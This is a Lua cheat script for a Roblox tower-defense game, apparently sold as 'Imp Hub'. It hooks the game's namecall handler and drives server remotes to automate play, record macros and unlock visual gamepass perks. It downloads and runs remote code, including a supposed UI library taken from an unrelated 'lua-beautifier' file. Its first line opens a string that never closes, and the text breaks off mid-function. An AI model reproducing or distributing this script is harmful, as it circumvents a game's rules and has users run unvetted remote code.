-- Obfuscated By Trex - https://discord.gg/9VtMXsjmBM


local SshEhIbiNX = "assert(Progress, "Your Executor Does Not Support One Of Our Functuons, Please Change To A Better One.")

local function TheScript()
    local UI = Progress
	   UI.Login.Object.Visible = false
	   UI.Hub.Object.Visible = false
	   UI.Window:Close()
	   
	   local Fluent =
    loadstring(
    game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Coems/refs/heads/main/lua-beautifier.lua.txt")
)()
local SaveManager =
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager =
    loadstring(
    game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua")
)()

local Window =
    Fluent:CreateWindow(
    {
        Title = "Imp Hub",
        SubTitle = "Spongebob Tower Defense",
        TabWidth = 130,
        Size = UDim2.fromOffset(500, 400),
        Acrylic = true,
        Theme = "Imp",
        MinimizeKey = Enum.KeyCode.LeftControl
    }
)

local Tabs = {
    Log = Window:AddTab({Title = "- Log", Icon = "server"}),
    Join = Window:AddTab({Title = "- Join Game", Icon = "play"}),
    Game = Window:AddTab({Title = "- Gameplay", Icon = "power"}),
    Main = Window:AddTab({Title = "- Macro", Icon = "file-code"}),
    Webhook = Window:AddTab({Title = "- Webhook", Icon = "cast"}),
    Summon = Window:AddTab({Title = "- Banner", Icon = "ticket"}),
    Lobby = Window:AddTab({Title = "- Lobby", Icon = "armchair"}),
    Player = Window:AddTab({Title = "- Player", Icon = "user"}),
    Credits = Window:AddTab({Title = "- Credits", Icon = "hand"}),
    Settings = Window:AddTab({Title = "- Settings", Icon = "settings"})
}

local Plr = game.Players.LocalPlayer
local GS = game:GetService("GuiService")
local VIM = game:GetService("VirtualInputManager")
local VU = game:GetService("VirtualUser")
local TS = game:GetService("TeleportService")
local Http = game:GetService("HttpService")
local Macros = {}
local CurrentMacro = {}
local CompletedActions = {}
local ActionsCompleted = 0
local Recording = false
local Replaying = false
local hook
local currentwave
local gotwave

local IsJoiningGame = false
local IsJoiningChallenge = false

local Stages = {}
local Acts = {"1", "2", "3", "4", "5", "6"}
local Difficulties = {"Normal", "Hard", "Nightmare"}

if isfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json") then
    Macros = Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json"))
end

if not isfolder("Imp Hub") then
    makefolder("Imp Hub")
end

if not isfolder("Imp Hub" .. "/SpongebobTD") then
    makefolder("Imp Hub" .. "/SpongebobTD")
    task.wait(0.5)
    makefolder("Imp Hub" .. "/SpongebobTD/Macros")
    task.wait(0.4)
    writefile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json", "[]")
end
local Files = Macros or {"No Saved Macros"}

local function SaveAction(Type, Data)
    if Type == "Place" then
        table.insert(
            CurrentMacro,
            {
                type = Type,
                data = {
                    unit = Data.unit,
                    wave = Data.wave,
                    cframe = Data.cframe,
                    requiredmoney = Data.requiredmoney
                }
            }
        )
    elseif Type == "Upgrade" then
        table.insert(
            CurrentMacro,
            {
                type = Type,
                data = {
                    unit = Data.unit,
                    cframe = Data.cframe,
                    upgrade = Data.upgrade,
                    wave = Data.wave
                }
            }
        )
    elseif Type == "Priority" then
        table.insert(
            CurrentMacro,
            {
                type = Type,
                data = {
                    unit = Data.unit,
                    cframe = Data.cframe,
                    priority = Data.priority,
                    wave = Data.wave
                }
            }
        )
    elseif Type == "Skip" then
        table.insert(
            CurrentMacro,
            {
                type = Type,
                data = {
                    wave = Data.wave
                }
            }
        )
    elseif Type == "StartGame" then
        table.insert(
            CurrentMacro,
            {
                type = Type,
                data = {
                    wave = Data.wave
                }
            }
        )
    end
end

local function GetCost(Unit)
    local cost
    for i, v in ipairs(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Bottom.Hotbar:GetChildren()) do
        if
            v:FindFirstChild("Content") and v.Content:FindFirstChild("TowerInfo") and
                v.Content.TowerInfo:FindFirstChild("ViewportFrame") and
                v.Content.TowerInfo.ViewportFrame:FindFirstChild("WorldModel") and
                v.Content.TowerInfo.ViewportFrame.WorldModel:GetChildren()[1].Name == Unit
         then
            cost = v.Content.TowerInfo.Cost.Amount.Text
        end
    end
    return cost
end

local function GetSlot(Unit)
    local slot
    for i, v in ipairs(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Bottom.Hotbar:GetChildren()) do
        if
            v:FindFirstChild("Content") and v.Content:FindFirstChild("TowerInfo") and
                v.Content.TowerInfo:FindFirstChild("ViewportFrame") and
                v.Content.TowerInfo.ViewportFrame:FindFirstChild("WorldModel") and
                v.Content.TowerInfo.ViewportFrame.WorldModel:GetChildren()[1].Name == Unit
         then
            slot = v.Name
        end
    end
    return slot
end

local function GetNumByPriority(prior)
    if prior then
        if prior == "FirstInRange" then
            return 1
        elseif prior == "LastInRange" then
            return 2
        end
    end
end

local function GetClosestUnitByPos(dist)
    local nearestunit
    local nearestdist = math.huge
    for i, v in ipairs(workspace.Friendlies:GetChildren()) do
        local OwnerId = v:GetAttribute("OwnerId")
        if OwnerId and tostring(OwnerId) == tostring(Plr.UserId) then
            local distance = (v.RootPart.Position - dist).Magnitude
            if distance < nearestdist then
                nearestunit = v:GetAttribute("Id")
                nearestdist = distance
            end
        end
    end
    return nearestunit
end

local function ReplayMacro(macro)
    if macro then
        local ActionsToComplete = #Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/" .. macro))
        for i, v in ipairs(Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/" .. macro))) do
            task.wait()
            gotwave =
                game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                "%D",
                ""
            )
            currentwave = tonumber(gotwave)
            if v.type == "Place" then
                if currentwave >= tonumber(v.data.wave) and not CompletedActions[i] then
                    if
                        tonumber(
                            game:GetService("Players").LocalPlayer.PlayerGui.HUD.Bottom.GameCurrency.Coins.Title.Text
                        ) >= tonumber(v.data.requiredmoney)
                     then
                        local cframeParts = string.split(v.data.cframe, ", ")
                        local cframe =
                            CFrame.new(
                            tonumber(cframeParts[1]),
                            tonumber(cframeParts[2]),
                            tonumber(cframeParts[3]),
                            tonumber(cframeParts[4]),
                            tonumber(cframeParts[5]),
                            tonumber(cframeParts[6]),
                            tonumber(cframeParts[7]),
                            tonumber(cframeParts[8]),
                            tonumber(cframeParts[9]),
                            tonumber(cframeParts[10]),
                            tonumber(cframeParts[11]),
                            tonumber(cframeParts[12])
                        )
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                            "sleitnick_knit@1.7.0"
                        ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TowerService"):WaitForChild("RF"):WaitForChild(
                            "PlaceTower"
                        ):InvokeServer(cframe, tonumber(GetSlot(v.data.unit)))
                        ActionsCompleted = ActionsCompleted + 1
                        CompletedActions[i] = true
                    end
                end
            elseif v.type == "Upgrade" then
                if currentwave >= tonumber(v.data.wave) and not CompletedActions[i] then
                    for i2, v2 in ipairs(workspace.Friendlies:GetChildren()) do
                        if GetClosestUnitByPos(v2.RootPart.Position) ~= nil then
                            if v2:GetAttribute("Upgrade") < v.data.upgrade and v2.Name == v.data.unit then
                                repeat
                                    task.wait(1)
                                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                        "sleitnick_knit@1.7.0"
                                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild(
                                        "RF"
                                    ):WaitForChild("UpgradeTower"):InvokeServer(
                                        GetClosestUnitByPos(v2.RootPart.Position)
                                    )
                                until v2:GetAttribute("Upgrade") >= v.data.upgrade
                                CompletedActions[i] = true
                                ActionsCompleted = ActionsCompleted + 1
                            end
                        end
                    end
                end
            elseif v.type == "Priority" then
                if currentwave >= tonumber(v.data.wave) and not CompletedActions[i] then
                    for i3, v3 in ipairs(workspace.Friendlies:GetChildren()) do
                        if GetClosestUnitByPos(v3.RootPart.Position) ~= nil and v3.Name == v.data.unit then
                            if v3:GetAttribute("AttackMode") ~= v.data.priority then
                                local args = {
                                    [1] = GetClosestUnitByPos(v3.RootPart.Position),
                                    [2] = GetNumByPriority(v.data.priority)
                                }

                                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                    "sleitnick_knit@1.7.0"
                                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild(
                                    "RF"
                                ):WaitForChild("ChangeTowerTargetMode"):InvokeServer(
                                    GetClosestUnitByPos(v3.RootPart.Position),
                                    GetNumByPriority(v.data.priority)
                                )
                                CompletedActions[i] = true
                                ActionsCompleted = ActionsCompleted + 1
                            end
                        end
                    end
                end
            elseif v.type == "StartGame" then
                if
                    currentwave == tonumber(v.data.wave) and
                        game:GetService("Players").LocalPlayer.PlayerGui.GameStart.Enabled
                 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                        "sleitnick_knit@1.7.0"
                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild("RF"):WaitForChild(
                        "VoteStartRound"
                    ):InvokeServer()
                    ActionsCompleted = ActionsCompleted + 1
                    CompletedActions[i] = true
                end
            elseif v.type == "Skip" then
                if
                    currentwave == tonumber(v.data.wave) and
                        game:GetService("Players").LocalPlayer.PlayerGui.VoteSkip.Enabled
                 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                        "sleitnick_knit@1.7.0"
                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild("RF"):WaitForChild(
                        "VoteSkipRound"
                    ):InvokeServer()
                    ActionsCompleted = ActionsCompleted + 1
                    CompletedActions[i] = true
                end
            end
        end
    end
end

local function clickbutton(button)
    if button then
        GS.SelectedObject = button
        task.wait(0.1)
        VIM:SendKeyEvent(true, 13, false, game)
        task.wait(0.1)
        VIM:SendKeyEvent(false, 13, false, game)
        task.wait(0.2)
        GS.SelectedObject = nil
    end
end

local function TeleportToLobby()
    local Servers =
        Http:JSONDecode(
        game:HttpGet(
            "https://games.roblox.com/v1/games/" ..
                tostring(123662243100680) .. "/servers/Public?sortOrder=Asc&limit=100"
        )
    ).data
    local RandomServer = Servers[math.random(1, #Servers)]
    TS:TeleportToPlaceInstance(123662243100680, RandomServer.id, Plr)
end

if hookmetamethod then
    hook =
        hookmetamethod(
        game,
        "__namecall",
        function(self, ...)
            if Recording then
                if not checkcaller() and getnamecallmethod() == "InvokeServer" then
                    local args = {...}
                    if self.Name == "VoteStartRound" then
                        SaveAction(
                            "StartGame",
                            {
                                wave = game.Players.LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                )
                            }
                        )
                        return hook(self, unpack(args))
                    elseif self.Name == "VoteSkipRound" then
                        SaveAction(
                            "Skip",
                            {
                                wave = game.Players.LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                )
                            }
                        )
                        return hook(self, unpack(args))
                    end
                end
            end
            return hook(self, ...)
        end
    )
end

pcall(
    function()
        for i, v in ipairs(
            game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.SelectionScreen.Main.StageSelect.WorldSelect.Content.Stages:GetChildren(

            )
        ) do
            if v:IsA("TextButton") and v.Name ~= "ComingSoon" then
                table.insert(Stages, v.Name)
            end
        end
    end
)

Tabs.Log:AddSection("Update Log 📆")

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.0 | 1-4-25",
        Content = [[
    - Released.
    ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.02 | 1-5-25",
        Content = [[
    - Copy Macro JSON String.
    ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.03 | 1-5-25",
        Content = [[
    - Anti AFK On Execute,
    > Webhooks Improvements,
    > More Content On Webhooks,
    > Stabilized More The Script,
    > Less Lag.
    ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.035 | 1-7-25",
        Content = [[
     - Fixed Macro Not Saving On Others Executors That Was Not Delta.
     ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.1 | 1-7-25",
        Content = [[
     - Leave On Wave,
     - Open Upgrade Gui On Upgraded Unit,
     - Added More Macro Actions {Start Game, Skip Wave},
     > Much More Improvements.
     ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.13 | 1-13-25",
        Content = [[
	   - New Tab (Join Game),
	   - Select Stage,
	   - Select Act,
	   - Select Difficult,
	   - Enable Start Game On Join,
	   - Automatic Join Game.
	   ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.16 | 1-19-25",
        Content = [[
	  - Set X3 Speed [Gamepass Required],
	  - Allow Ping Everyone,
	  - Free VIP Gamepass [Visual],
	  - Free Ultra VIP Gamepass [Visual],
	  > Fixed And Improved Macro,
	  > Webhooks Will Also Show You The Player Level After Completing A Game.
	  ]]
    }
)

Tabs.Log:AddParagraph(
    {
        Title = "Update V1.18 | 1-21-25",
        Content = [[
	  - Automatic Join Random Challenge,
	  > Added Upgrade & Priority Actions To Macro,
	  - Macro Recorder Bug Fixes,
	  * Others Improvements.
	  ]]
    }
)

Tabs.Join:AddSection("Joining Games 🛩")

Tabs.Join:AddDropdown(
    "stage",
    {
        Title = "Stage",
        Description = "",
        Values = Stages,
        Multi = false,
        Default = "",
        Callback = function(t)
            stage = t
        end
    }
)

Tabs.Join:AddDropdown(
    "act",
    {
        Title = "Act",
        Description = "",
        Values = Acts,
        Multi = false,
        Default = "",
        Callback = function(t)
            act = t
        end
    }
)

Tabs.Join:AddDropdown(
    "diff",
    {
        Title = "Difficulty",
        Description = "",
        Values = Difficulties,
        Multi = false,
        Default = "",
        Callback = function(t)
            diff = t
        end
    }
)

Tabs.Join:AddToggle(
    "startgme",
    {
        Title = "Start Game",
        Description = "- Will Start Game On Join",
        Default = false,
        Callback = function(t)
            startgme = t
        end
    }
)

Tabs.Join:AddToggle(
    "autojoin",
    {
        Title = "Automatic Join Game",
        Description = "Will Choose A Join Space That Ain't Used Already And Script Will Choose All Settings U Set Before, Then It Will Start Game",
        Default = false,
        Callback = function(t)
            autojoin = t
            while autojoin do
                task.wait(0.4)
                if stage and act and diff then
                    pcall(
                        function()
                            for i, v in ipairs(workspace.Matchmakers:GetChildren()) do
                                if
                                    v.QueueInfo.QueueInfo.Status.Title.Text ~= "Selecting..." and
                                        v.QueueInfo.QueueInfo.Status.Title.Text ~= "" and
                                        not v:GetAttribute("Challenge") and
                                        IsJoiningGame == false
                                 then
                                    Plr.Character:PivotTo(v:GetPivot())
                                    IsJoiningGame = true
                                    task.wait(0.5)
                                    clickbutton(
                                        game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.SelectionScreen.Main.StageSelect.WorldSelect.Content.Stages[
                                            stage
                                        ]
                                    )
                                    task.wait(0.5)
                                    clickbutton(
                                        game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.SelectionScreen.Main.StageSelect.ChapterSelect.Act1_Chapters[
                                            "Chapter_" .. act
                                        ]
                                    )
                                    task.wait(0.5)
                                    clickbutton(
                                        game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.SelectionScreen.Main.StageSelect.Info.Content.Difficulties[
                                            diff
                                        ]
                                    )
                                    task.wait(1)
                                    clickbutton(
                                        game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.SelectionScreen.Main.Options.Options.Confirm
                                    )
                                    task.wait(1.2)
                                    IsJoiningGame = false
                                    if startgme then
                                        clickbutton(
                                            game:GetService("Players").LocalPlayer.PlayerGui.QueueScreen.Main.StartScreen.Main.Options.Start
                                        )
                                    end
                                end
                            end
                        end
                    )
                else
                    Fluent:Notify(
                        {
                            Title = "Imp Hub",
                            Content = "Error",
                            SubContent = "You Didn't Set All The Configurations For Automatic Join.",
                            Duration = 5
                        }
                    )
                end
            end
        end
    }
)

Tabs.Join:AddToggle(
    "autojoinchallenge",
    {
        Title = "Automatic Join Random Challenge",
        Description = "- Will Join To A Random Challenge",
        Default = false,
        Callback = function(t)
            autojoinchallenge = t
            while autojoinchallenge do
                task.wait(1)
                pcall(
                    function()
                        for i, v in ipairs(workspace.Matchmakers:GetChildren()) do
                            if
                                v.QueueInfo.QueueInfo.Status.Title.Text ~= "Selecting..." and
                                    v.QueueInfo.QueueInfo.Status.Title.Text ~= "" and
                                    v:GetAttribute("Challenge") and
                                    IsJoiningChallenge == false
                             then
                                IsJoiningChallenge = true
                                Plr.Character:PivotTo(v:GetPivot())
                            end
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddSection("Upgrading Units 📥")

Tabs.Game:AddSlider(
    "upgdelay",
    {
        Title = "Upgrade Delay",
        Description = "",
        Default = 6,
        Min = 1,
        Max = 60,
        Rounding = 1,
        Callback = function(t)
            upgdelay = t
        end
    }
)

Tabs.Game:AddToggle(
    "upg",
    {
        Title = "Upgrade Units",
        Description = "- This Will Upgrade All Your Units",
        Default = false,
        Callback = function(t)
            upg = t
            while upg do
                task.wait(upgdelay)
                pcall(
                    function()
                        for i, v in ipairs(workspace.Friendlies:GetChildren()) do
                            if
                                tostring(v:GetAttribute("OwnerId")) == tostring(Plr.UserId) and
                                    v:GetAttribute("Upgrade") < v:GetAttribute("MaxUpgrades")
                             then
                                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                    "sleitnick_knit@1.7.0"
                                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild(
                                    "RF"
                                ):WaitForChild("UpgradeTower"):InvokeServer(v:GetAttribute("Id"))
                                if openguionupg then
                                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                        "sleitnick_knit@1.7.0"
                                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TowerService"):WaitForChild(
                                        "RF"
                                    ):WaitForChild("SubscribeToTower"):InvokeServer(v:GetAttribute("Id"))
                                    task.wait(2)
                                    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                        "sleitnick_knit@1.7.0"
                                    ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TowerService"):WaitForChild(
                                        "RF"
                                    ):WaitForChild("UnsubscribeFromTower"):InvokeServer(v:GetAttribute("Id"))
                                end
                            end
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "openguionupg",
    {
        Title = "Open Upgrade Gui On Upgrade",
        Description = "- This Will Open The Upgrade Gui Of The Upgraded Unit",
        Default = false,
        Callback = function(t)
            openguionupg = t
        end
    }
)

Tabs.Game:AddToggle(
    "upgon",
    {
        Title = "Notify On Unit Upgraded",
        Description = "- This Will Send A UI Notify Everytime A Unit Get's Upgraded",
        Default = false,
        Callback = function(t)
            upgon = t
        end
    }
)

Tabs.Game:AddSection("Sell Units 🏷")

Tabs.Game:AddInput(
    "wavesell",
    {
        Title = "Wave",
        Default = "1",
        Placeholder = "...",
        Numeric = false,
        Finished = false,
        Callback = function(t)
            wavesell = tonumber(t)
        end
    }
)

Tabs.Game:AddToggle(
    "sellonwave",
    {
        Title = "Sell On Wave",
        Description = "- This Will Sell All Your Units On The Set Wave",
        Default = false,
        Callback = function(t)
            sellonwave = t
            while sellonwave do
                task.wait()
                pcall(
                    function()
                        if
                            tonumber(
                                game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                )
                            ) == wavesell
                         then
                            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                "sleitnick_knit@1.7.0"
                            ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TowerService"):WaitForChild(
                                "RF"
                            ):WaitForChild("SellAllTowers"):InvokeServer()
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "leaveonwave",
    {
        Title = "Leave On Wave",
        Description = "- This Will Teleport You To Lobby On Reached Wave",
        Default = false,
        Callback = function(t)
            leaveonwave = t
            while leaveonwave do
                task.wait()
                pcall(
                    function()
                        if
                            tonumber(
                                game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Top.Main.StageInfo.Frame.CurrentWave.Text:gsub(
                                    "%D",
                                    ""
                                )
                            ) == wavesell
                         then
                            TeleportToLobby()
                            task.wait(0.5)
                            Fluent:Notify(
                                {
                                    Title = "Imp Hub",
                                    Content = "¡Reached Wave!",
                                    SubContent = "Teleporting To Lobby...",
                                    Duration = 5
                                }
                            )
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddButton(
    {
        Title = "Sell All Units",
        Description = "- Will Sell All Your Placed Units",
        Callback = function()
            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                "sleitnick_knit@1.7.0"
            ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TowerService"):WaitForChild("RF"):WaitForChild(
                "SellAllTowers"
            ):InvokeServer()
        end
    }
)

Tabs.Game:AddSection("Units Priority 📰")

Tabs.Game:AddDropdown(
    "priorityset",
    {
        Title = "Priority",
        Description = "- Priority To Set Your Units To",
        Values = {"FirstInRange", "LastInRange"},
        Multi = false,
        Default = "",
        Callback = function(t)
            priorityset = t
        end
    }
)

Tabs.Game:AddToggle(
    "setpriority",
    {
        Title = "Set Priority",
        Description = "- Will Set All Your Units Priority To Selected Priority",
        Default = false,
        Callback = function(t)
            setpriority = t
            while setpriority do
                task.wait(0.6)
                pcall(
                    function()
                        for i, v in ipairs(workspace.Friendlies:GetChildren()) do
                            if
                                tostring(v:GetAttribute("OwnerId")) == tostring(Plr.UserId) and
                                    v:GetAttribute("AttackMode") ~= priorityset and
                                    priorityset ~= ""
                             then
                                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                    "sleitnick_knit@1.7.0"
                                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild(
                                    "RF"
                                ):WaitForChild("ChangeTowerTargetMode"):InvokeServer(v:GetAttribute("Id"), priorityset)
                            end
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddSection("Misc 📎")

Tabs.Game:AddToggle(
    "start",
    {
        Title = "Automatic Vote Start Game",
        Description = "- Will Auto Start Game",
        Default = false,
        Callback = function(t)
            start = t
            while start do
                task.wait()
                pcall(
                    function()
                        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                            "sleitnick_knit@1.7.0"
                        ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild("RF"):WaitForChild(
                            "VoteStartRound"
                        ):InvokeServer()
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "skip",
    {
        Title = "Automatic Skip Wave",
        Description = "- Will Auto Skip Wave",
        Default = false,
        Callback = function(t)
            skip = t
            while skip do
                task.wait(1)
                pcall(
                    function()
                        if game:GetService("Players").LocalPlayer.PlayerGui.VoteSkip.Enabled then
                            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                                "sleitnick_knit@1.7.0"
                            ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild(
                                "RF"
                            ):WaitForChild("VoteSkipRound"):InvokeServer()
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "autospd",
    {
        Title = "Automatic Set Speed [X2]",
        Description = "- Will Auto Set Speed To X2",
        Default = false,
        Callback = function(t)
            autospd = t
            while autospd do
                task.wait(3)
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                    "sleitnick_knit@1.7.0"
                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild("RF"):WaitForChild(
                    "ChangeGameSpeed"
                ):InvokeServer(2)
            end
        end
    }
)

Tabs.Game:AddToggle(
    "autospdthree",
    {
        Title = "Automatic Set Speed [X3 Gamepass Required]",
        Description = "- Will Auto Set Speed To X3",
        Default = false,
        Callback = function(t)
            autospdthree = t
            while autospdthree do
                task.wait(3)
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild(
                    "sleitnick_knit@1.7.0"
                ):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("GameService"):WaitForChild("RF"):WaitForChild(
                    "ChangeGameSpeed"
                ):InvokeServer(3)
            end
        end
    }
)

Tabs.Game:AddSection("Finished Game 🎬")

Tabs.Game:AddToggle(
    "retry",
    {
        Title = "Automatic Replay Game",
        Description = "- Will Replay On Finished Game",
        Default = false,
        Callback = function(t)
            retry = t
            while retry do
                task.wait(0.6)
                pcall(
                    function()
                        if game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Enabled then
                            clickbutton(
                                game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Actions.Replay
                            )
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "nextd",
    {
        Title = "Automatic Next Game",
        Description = "- Will Click Next On Finished Game",
        Default = false,
        Callback = function(t)
            nextd = t
            while nextd do
                task.wait(0.6)
                pcall(
                    function()
                        if game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Enabled then
                            clickbutton(
                                game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Actions.Next
                            )
                        end
                    end
                )
            end
        end
    }
)

Tabs.Game:AddToggle(
    "back",
    {
        Title = "Automatic Back To Lobby",
        Description = "- Will Teleport Back To Lobby On Finished Game",
        Default = false,
        Callback = function(t)
            back = t
            while back do
                task.wait(0.6)
                pcall(
                    function()
                        if game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Enabled then
                            clickbutton(
                                game:GetService("Players").LocalPlayer.PlayerGui.RoundSummary.Main.Content.Return
                            )
                        end
                    end
                )
            end
        end
    }
)

Tabs.Main:AddSection("Information 📋")

Tabs.Main:AddParagraph(
    {
        Title = "How To Use❓",
        Content = [[
    1.- Set Macro Name,
    2.- Toggle On Record,
    3.- When It Is Finished, Toggle Record Off
    
    4.- Select Macro,
    5.- Toggle On Replay Macro.
    ]]
    }
)

Tabs.Main:AddParagraph(
    {
        Title = "Tip ⛔",
        Content = [[
    - Don't Place Units Too Close.
    ]]
    }
)

Tabs.Main:AddSection("Set Up Macro 📂")

local macrodrop =
    Tabs.Main:AddDropdown(
    "MacroSelected",
    {
        Title = "Select Macro",
        Description = "Macro To Replay",
        Values = Files,
        Multi = false,
        Default = "",
        Callback = function(t)
            macro = t
        end
    }
)

Tabs.Main:AddButton(
    {
        Title = "Delete Macro Selected",
        Description = "",
        Callback = function()
            pcall(
                function()
                    if macro then
                        delfile("Imp Hub" .. "/SpongebobTD/" .. macro)

                        table.clear(Files)
                        for i, v in pairs(
                            Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json"))
                        ) do
                            if i ~= macro then
                                Files[i] = i
                            end
                        end
                        writefile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json", Http:JSONEncode(Files))
                        macrodrop:SetValues(Files)
                        Fluent:Notify(
                            {
                                Title = "Imp Hub",
                                Content = "Macro Deleted",
                                SubContent = "Successfully Deleted: " .. macro,
                                Duration = 5
                            }
                        )
                    end
                end
            )
        end
    }
)

Tabs.Main:AddButton(
    {
        Title = "Refresh Files",
        Description = "",
        Callback = function()
            pcall(
                function()
                    table.clear(Files)
                    for i, v in pairs(Http:JSONDecode(readfile("Imp Hub" .. "/SpongebobTD/Macros/SavedMacros.json"))) do
                        table.insert(Files, i)
                        macrodrop:SetValues(Files)
                    end
                end
            )
        end
    }
)

Tabs.Main:AddButton(
    {
        Title = "Copy Macro JSON String",
        Description = "- Will Copy Macro JSON, Works For Sharing It On Discord Server (https://dsc.gg/imphub)",
        Callback = function()
            local succ, err =
                pcall(
                function()
                    setclipboard(tostring(readfile("Imp Hub" .. "/SpongebobTD/" .. macro)))
                end
            )

            if succ then
                Fluent:Notify(
                    {
                        Title = "Imp Hub",
                        Content = "Successfully Copied Selected Macro JSON String",
                        SubContent = "Copied To Clipboard",
                        Duration = 5
                    }
                )
            elseif err then
                Fluent:Notify(
                    {
                        Title = "Imp Hub",
                        Content = "Error Copying Selected Macro JSON String",
                        SubContent = "Error",
                        Duration = 5
                    }
                )
            end
        end
    }
)

Tabs.Main:AddInput(
    "SettingMacro",
    {
        Title = "Macro Name",
        Default = "",
        Placeholder = "Macro Name Here",
        Numeric = false,
        Finished = false,
        Callback = function(t)
            macrotorecord = t
        end
    }
)

Tabs.Main:AddSection("Start Macro 🔧")

Tabs.Main:AddToggle(
    "RecordingMacro",
    {
        Title = "Start Recording",
        Description = "- Will Start Recording The Actions",
        Default = false,
        Callback = function(t)
            Recording = t

            pcall(
                function()
                    if Recording then
                        Fluent:Notify(
                            {
                                Title = "Imp Hub",
                                Content = "Started Recording Macro",
                                SubContent = "",
                                Duration = 5
                            }
                        )
                    elseif Recording == false and macrotorecord == "" then
                        Fluent:Notify(
                            {
                                Title = "Imp Hub",
                                Content = "Macro Name Was Not Set",
                                SubContent = "Please Record Again With A Set Name.",
                                Duration = 10
                            }
                        )
                    elseif Recording == false and Macros[macrotorecord] then
                        Fluent:Notify(
                            {
                                Title = "Imp Hub",
